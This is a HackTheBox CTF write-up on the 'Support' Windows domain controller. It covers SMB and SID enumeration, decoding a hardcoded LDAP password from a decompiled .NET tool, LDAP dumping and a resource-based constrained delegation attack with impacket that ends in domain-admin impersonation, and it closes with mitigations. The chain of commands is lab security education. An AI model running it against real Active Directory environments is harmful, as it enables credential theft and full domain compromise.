---
title: HackTheBox - Support
author: solidgoat
date: 2022-11-27 11:33:00 EDT
categories: [HackTheBox, Machines]
tags: [windows, ctf, hackthebox, htb, walkthrough, easy, active directory, pass the hash, tickets, rbcd, delegation, resource based contrained delegation]
image:
  path: /assets/img/posts/Support/htb-support-logo.png
  width: 800
  height: 500
  alt: Walkthrough of Support from HackTheBox
---

## Overview

This is a Windows 2022 Domain Controller that is sharing a custom executable containing hardcoded credentials on an SMB share that allows for guest access. The hard-coded credentials are used to enumerate the domain accounts further, gain low-level access to the Domain Controller, then through misconfigurations with user attributes and Active Directory permissions, we're able to impersonate the Domain Admin with a pass-the-ticket attack.

This machine was marked as easy, but I feel this was a bit challenging for a beginner.

### Tools Used

* Nmap
* [crackmapexec](https://www.kali.org/tools/crackmapexec/)
* [impacket](https://github.com/SecureAuthCorp/impacket)
* [ILSpy (Avalonia)](https://github.com/icsharpcode/AvaloniaILSpy)
* [JDoodle (Online Compiler)](https://www.jdoodle.com/)
* [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
* [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
* [Bloodhound](https://www.kali.org/tools/bloodhound/)
* [Bloodhound.py](https://github.com/fox-it/BloodHound.py) (A Python based ingestor for BloodHound, based on Impacket.)

## Enumeration

### Port Scan
Running an Nmap TCP scan on against all ports (`0 - 65536`) on `10.10.11.174` shows that this is clearly a Domain Controller.

Ports: `88/TCP` (Kerberos), `389/TCP` (LDAP), `3268-3269/TCP` (Global Catalog) being the main indicators.

```
# Nmap 7.93 scan initiated Sun Nov 27 23:29:26 2022 as: nmap -T4 -Pn -n -O --osscan-limit -sC -sV -p- --open -oA nmap-tcp-all-full --min-parallelism 100 --min-rate 2000 10.10.11.174
Nmap scan report for 10.10.11.174
Host is up (0.017s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-28 04:30:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-28T04:31:27
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 27 23:32:07 2022 -- 1 IP address (1 host up) scanned in 161.15 seconds
```

### Information Gathering

#### SMB Shares

Because `445/TCP` is open, we would naturally inquire about what shares we can see and access.

Using `crackmapexec`, I enumerated the shares using the `guest` account, because the server didn't allow for anonymous access, and it looks like the only ones that are readable are `IPC$` and `support-tools`.

```
$ crackmapexec smb -d support.htb -u 'guest' -p '' --shares 10.10.11.174
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [+] Enumerated shares
SMB         10.10.11.174    445    DC               Share           Permissions     Remark
SMB         10.10.11.174    445    DC               -----           -----------     ------
SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.174    445    DC               C$                              Default share
SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools
SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share
```

Connecting to the `support-tools` share, we can see some files (executables) being hosted.

There's something interesting about `UserInfo.exe.zip`; it's the only file that has a different date compared to the other files.

I'll come back to that later on.

```
$ smbclient -N //10.10.11.174/support-tools
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 958242 blocks available
smb: \> 
```

#### DNS

I ran a `dig` to see if I can perform a zone transfer...I can't.

```
$ dig @10.10.11.174 management.support.htb AXFR

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.11.174 management.support.htb AXFR
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

But I can ask the server to run a DNS query against itself to get any other records it may be hosting. We can see the FQDN of the server is `dc.support.htb`.

```
$ dig @10.10.11.174 support.htb ANY 

; <<>> DiG 9.18.8-1-Debian <<>> @10.10.11.174 support.htb ANY
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14202
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.                   IN      ANY

;; ANSWER SECTION:
support.htb.            600     IN      A       10.10.11.174
support.htb.            3600    IN      NS      dc.support.htb.
support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.support.htb.         3600    IN      A       10.10.11.174

;; Query time: 16 msec
;; SERVER: 10.10.11.174#53(10.10.11.174) (TCP)
;; WHEN: Mon Nov 28 19:20:39 EST 2022
;; MSG SIZE  rcvd: 136
```

#### AD Users

Since `IPC$` is readable, we are able to run `impacket`'s `lookupsid.py` to enumerate the user accounts. I initially attempted this with `enum4linux`, but that didn't return any user information.

```
$ python3 lookupsid.py guest@10.10.11.174
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.11.174
[*] StringBinding ncacn_np:10.10.11.174[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1677581083-3380853377-188903654
498: SUPPORT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SUPPORT\Administrator (SidTypeUser)
501: SUPPORT\Guest (SidTypeUser)
502: SUPPORT\krbtgt (SidTypeUser)
512: SUPPORT\Domain Admins (SidTypeGroup)
513: SUPPORT\Domain Users (SidTypeGroup)
514: SUPPORT\Domain Guests (SidTypeGroup)
515: SUPPORT\Domain Computers (SidTypeGroup)
516: SUPPORT\Domain Controllers (SidTypeGroup)
517: SUPPORT\Cert Publishers (SidTypeAlias)
518: SUPPORT\Schema Admins (SidTypeGroup)
519: SUPPORT\Enterprise Admins (SidTypeGroup)
520: SUPPORT\Group Policy Creator Owners (SidTypeGroup)
521: SUPPORT\Read-only Domain Controllers (SidTypeGroup)
522: SUPPORT\Cloneable Domain Controllers (SidTypeGroup)
525: SUPPORT\Protected Users (SidTypeGroup)
526: SUPPORT\Key Admins (SidTypeGroup)
527: SUPPORT\Enterprise Key Admins (SidTypeGroup)
553: SUPPORT\RAS and IAS Servers (SidTypeAlias)
571: SUPPORT\Allowed RODC Password Replication Group (SidTypeAlias)
572: SUPPORT\Denied RODC Password Replication Group (SidTypeAlias)
1000: SUPPORT\DC$ (SidTypeUser)
1101: SUPPORT\DnsAdmins (SidTypeAlias)
1102: SUPPORT\DnsUpdateProxy (SidTypeGroup)
1103: SUPPORT\Shared Support Accounts (SidTypeGroup)
1104: SUPPORT\ldap (SidTypeUser)
1105: SUPPORT\support (SidTypeUser)
1106: SUPPORT\smith.rosario (SidTypeUser)
1107: SUPPORT\hernandez.stanley (SidTypeUser)
1108: SUPPORT\wilson.shelby (SidTypeUser)
1109: SUPPORT\anderson.damian (SidTypeUser)
1110: SUPPORT\thomas.raphael (SidTypeUser)
1111: SUPPORT\levine.leopoldo (SidTypeUser)
1112: SUPPORT\raven.clifton (SidTypeUser)
1113: SUPPORT\bardot.mary (SidTypeUser)
1114: SUPPORT\cromwell.gerard (SidTypeUser)
1115: SUPPORT\monroe.david (SidTypeUser)
1116: SUPPORT\west.laura (SidTypeUser)
1117: SUPPORT\langley.lucy (SidTypeUser)
1118: SUPPORT\daughtler.mabel (SidTypeUser)
1119: SUPPORT\stoll.rachelle (SidTypeUser)
1120: SUPPORT\ford.victoria (SidTypeUser)
2601: SUPPORT\MANAGEMENT$ (SidTypeUser)
```

We can't really do much more without more access. Just performing a simple lookup on the `support` account delivers an error.

```
$ ldapsearch -x -H ldap://support.htb -D 'support\guest' -w '' -b "CN=support,CN=Users,DC=support,DC=htb"
# extended LDIF
#
# LDAPv3
# base <CN=support,CN=Users,DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5A, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

#### Ldap Account Password

Now for the `UserInfo.exe.zip`.

Extracting the contents, we can see a number a files, one being the `UserInfo.exe`.

```
$ ls -al                                
total 672
drwxr-xr-x 2 kali kali   4096 Nov 28 20:07 .
drwxr-xr-x 3 kali kali   4096 Nov 28 23:54 ..
-rw-r--r-- 1 kali kali  99840 Mar  1  2022 CommandLineParser.dll
-rw-r--r-- 1 kali kali  22144 Oct 22  2021 Microsoft.Bcl.AsyncInterfaces.dll
-rw-r--r-- 1 kali kali  47216 Oct 22  2021 Microsoft.Extensions.DependencyInjection.Abstractions.dll
-rw-r--r-- 1 kali kali  84608 Oct 22  2021 Microsoft.Extensions.DependencyInjection.dll
-rw-r--r-- 1 kali kali  64112 Oct 22  2021 Microsoft.Extensions.Logging.Abstractions.dll
-rw-r--r-- 1 kali kali  20856 Feb 19  2020 System.Buffers.dll
-rw-r--r-- 1 kali kali 141184 Feb 19  2020 System.Memory.dll
-rw-r--r-- 1 kali kali 115856 May 15  2018 System.Numerics.Vectors.dll
-rw-r--r-- 1 kali kali  18024 Oct 22  2021 System.Runtime.CompilerServices.Unsafe.dll
-rw-r--r-- 1 kali kali  25984 Feb 19  2020 System.Threading.Tasks.Extensions.dll
-rwxr-xr-x 1 kali kali  12288 May 27  2022 UserInfo.exe
-rw-r--r-- 1 kali kali    563 May 27  2022 UserInfo.exe.config
```

Running `file` and `strings` against the file, I can tell that it's a 32 bit executable created using .NET 4.8.

```
$ file UserInfo.exe                            
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

```
$ strings UserInfo.exe
!This program cannot be run in DOS mode.
.text
`.rsrc
@.reloc
,Er
,ZsE
BSJB
v4.0.30319

...[snip]...

.NETFramework,Version=v4.8
FrameworkDisplayName
.NET Framework 4.8 
UserInfo.Program+<Main>d__0
/UserInfo.Commands.FindUser+<OnExecuteAsync>d__2
.UserInfo.Commands.GetUser+<OnExecuteAsync>d__2
username
Username
first
First name
last
        Last name
verbose
Verbose output
RSDS
C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb
_CorExeMain
mscoree.dll
```

And `UserInfo.exe.config` confirms .NET 4.8.

```
<supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
```

##### Decoding the Password (Method 1)
I used ILSpy to decompile the executable.

Stepping through the classes and methods, I came across `LdapQuery()` which appears to be making an LDAP query to the `support.htb` domain using the `ldap` account (Line 13). And the password that it's using is being created from the `Protected.getPassword()` method.

<img src="/assets/img/posts/Support/ilspy-ldap-query.png">

Navigating to that piece of code, we see that the password is being created using a for loop, Base64 string, and key ("armando").

<img src="/assets/img/posts/Support/ilspy-ldap-getpassword.png">

I didn't feel like compiling the code, so I dumped it into an online compiler [JDoodle](https://www.jdoodle.com/) and made some modifications so it would run properly.

Before:

<img src="/assets/img/posts/Support/jdoodle-getpassword1.png">

After:

<img src="/assets/img/posts/Support/jdoodle-getpassword2.png">

Code Modifications:
1. I remove the scope assignments (`private` and `public`)
2. Renamed `getPassword()` to `Main()` and changed its return type from `string` to `void`
   1. Apparently JDoodle needs a `Main()`
3. Moved `enc_password` and `key` variables to inside of `Main()`
4. Since I'm no longer returning anything, I need to remove `return` and wrap `Encoding.Default.GetString(array2)` with `Console.Write()`, so I can see the output

Here's the modified code for easy copy and pasting:

```csharp
// UserInfo.Services.Protected
using System;
using System.Text;

internal class Protected
{
	static void Main()
	{
	    string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	    byte[] key = Encoding.ASCII.GetBytes("armando");
	
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		Console.Write(Encoding.Default.GetString(array2));
	}
}
```

We can now see the password of `support.htb\ldap` is: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

##### Decoding the Password (Method 2)

You could also use [CyberChef](https://gchq.github.io/CyberChef/). (I realized this a bit later after staring at the code.)

Looking at the code, we know that `enc_password` is being decoded from Base64 (`Convert.FromBase64String(enc_password)`) and that the for loop is going through that decoded string using the bitwise XOR operator (^), the key ("armando"), and "0xDFu" to create the new string (password).

Using the From Base64 and two XOR recipes, we can decode the password.

<img src="/assets/img/posts/Support/cyberchef-password-decode.png">

#### More Access

Now that we have an actual account to authenticate with, we can start gathering more information about the users and groups. Using `ldapdomaindump`, I was able to pull that information.

```
$ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -o ./dump dc.support.htb
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

We can see that the `support` account is a member of the Built-In group [Remote Management Users](https://ss64.com/nt/syntax-security_groups.html), which is capable of using WMI for management tasks. So this is account is clearly what we need to focus on now.

<img src="/assets/img/posts/Support/ldapdomaindump-users.png">

I ran the following command in hopes of gathering more information and maybe seeing if a password was in the `Description` attribute...and it sort of was. It wasn't located in `Description`, but `info`.

```
$ ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=support,CN=Users,DC=support,DC=htb" '+' '*'
```

<img src="/assets/img/posts/Support/ldapdomaindump-users-support-attributes.png">

So now we have the `support` account's password (`Ironside47pleasure40Watchful`) and should be able to leverage WinRM for further access.

## Initial Foothold

Using `Evil-WinRM`, I was able to get a low-level shell and obtain the `user.txt` flag.

<img src="/assets/img/posts/Support/user-flag.png">

## Privilege Escalation

I used Bloodhound to gather more information about the domain; I wanted to see what other privileges the `support` or `ldap` account had, since I already know that it can remote into the Domain Controller using the former.

We can see that the `support` is a member of `Shared Support Accounts` and that group has `GenericAll`, which basically means the `support` account has full rights to the Domain Controller. We can use this to perform a Resource Based Constrained Delegation attack.

<img src="/assets/img/posts/Support/bloodhound.png">

### Methodology

1. Create a fake machine (computer) account
   1. By default, a non-administrator can create up to 10 computers unless the `ms-DS-MachineAccountQuota` has been modified
2. Delegate the fake machine account to act on behalf of the Domain Controller
3. Request a service ticket
4. Impersonate the Domain Admin account using pass-the-ticket

### Execution

I'm going to use `impacket` for all of this because I didn't feel like compiling [Rubeus](https://github.com/GhostPack/Rubeus).

Another benefit of doing it this way is that I can do all this from the attacker side instead of through the Evil-WinRM command shell which can be a bit cumbersome.

First we'll confirm that we can create at least one machine account by checking what `ms-DS-MachineAccountQuota` is set to.

<img src="/assets/img/posts/Support/machine-account-quota.png">

Another thing we need to confirm is that the Domain Admin account is able to be delegated. We can see that in Bloodhound.

<img src="/assets/img/posts/Support/bloodhound-administrator-cannot-be-delegated.png" width="50%" height="50%">

Next I'm going to use `impacket`'s `addcomputer.py` to create a fake computer account in the domain. I didn't include the `-computer-name` and `-computer-pass` switches so that the computer would look a little more authentic on the domain. I know it's only HTB, but still.

```
$ python3 addcomputer.py support.htb/support:'Ironside47pleasure40Watchful'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Successfully added machine account DESKTOP-8PAS755Y$ with password t7JfDdDkK8w52zNh1MjCAxkeBB1Jj8tf.
```

Now that we have a computer created, we need to give it the proper delegation so it's able to act on behalf of the Domain Controller.

Again, I'm using `impacket`'s `rbcd.py`.

```
$ python3 rbcd.py -delegate-from 'DESKTOP-8PAS755Y$' -delegate-to 'dc$' -dc-ip 10.10.11.174 -action 'write' support.htb/support:'Ironside47pleasure40Watchful'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Accounts allowed to act on behalf of other identity:
[*]
[*] Delegation rights modified successfully!
[*] DESKTOP-8PAS755Y$ can now impersonate users on dc$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     DESKTOP-8PAS755Y$   (S-1-5-21-1677581083-3380853377-188903654-5102)
```

And we can confirm that using `-action 'read'`.

```
$ python3 rbcd.py -delegate-to dc$ -dc-ip 10.10.11.174 -action 'read' support.htb/support:'Ironside47pleasure40Watchful'                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Accounts allowed to act on behalf of other identity:
[*]     DESKTOP-8PAS755Y$   (S-1-5-21-1677581083-3380853377-188903654-5102)
```

Lastly, we can request a service ticket with `impacket`'s `getST.py` using the fake computer and password we created earlier (`DESKTOP-8PAS755Y$:'t7JfDdDkK8w52zNh1MjCAxkeBB1Jj8tf'`) to impersonate the Domain Admin account (`administrator`).

We also need to assign the ticket's location to an environmental variable so we can use it in later pass-the-ticket commands.

```
$ python3 getST.py -impersonate administrator -dc-ip 10.10.11.174 support.htb/DESKTOP-8PAS755Y$:'t7JfDdDkK8w52zNh1MjCAxkeBB1Jj8tf' -spn host/dc.support.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache

$ export KRB5CCNAME=/opt/tools/impacket/examples/administrator.ccache
```

Now we can run `impacket`'s `psexec.py` with our service ticket to a elevate our privileges to `NT AUTHORITY\SYSTEM`.

```
$ python3 psexec.py SUPPORT.HTB/administrator:@dc.support.htb -k -no-pass -dc-ip 10.10.11.174
```

<img src="/assets/img/posts/Support/root-flag.png">

## Mitigation

* Never hard-code credentials in an application or script
* Never place passwords in any AD attribute
* Never allow anonymous access to shares
  * If less restrictive access is required, use `Authenticated Users` instead of `Everyone` for share permissions
* Add privileged accounts (Domain Admins, Enterprise Admins, Schema Admins, etc) to [Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) group
* Enable **Account is sensitive and cannot be delegated** on privileged accounts
  * [Protecting Privileged Domain Accounts: Safeguarding Access Tokens](https://www.sans.org/blog/protecting-privileged-domain-accounts-safeguarding-access-tokens/)
* Disable normal users from creating/adding computers to the domain